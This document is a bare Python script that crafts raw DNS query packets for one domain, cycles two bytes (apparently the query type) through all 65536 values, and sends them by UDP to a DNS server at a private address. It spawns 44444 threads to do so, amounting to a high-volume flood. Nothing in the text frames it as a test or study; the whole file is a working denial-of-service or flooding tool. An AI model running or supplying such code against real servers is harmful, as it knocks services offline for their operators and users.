import socket
import os
import threading
def send_requests():
    msg = b'''\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03gao\x06knight\x03com\x00''' 
    msg_2 = b'''\x00\x01\x00\x00)\x10\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x08\x00\x07\x00\x01\x18\x00\x82YY'''
    UDP_IP = "192.168.101.95"
    UDP_PORT = 53
    sock = socket.socket(socket.AF_INET,  # Internet
                        socket.SOCK_DGRAM)  # UDP
    for i in range(0, 65536):
        high_byte = (i >> 8) & 0xFF
        low_byte = i & 0xFF
    #msg_1 = b'\\x{:02x}\\x{:02x}'.format(high_byte, low_byte)
        msg_1 = bytes([high_byte, low_byte])
        msg_all = msg + msg_1 + msg_2
    #print(msg_1)
        sock.sendto(msg_all, (UDP_IP, UDP_PORT))
threads = []
for i in range(44444):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

# Keep the main thread alive
for thread in threads:
    thread.join()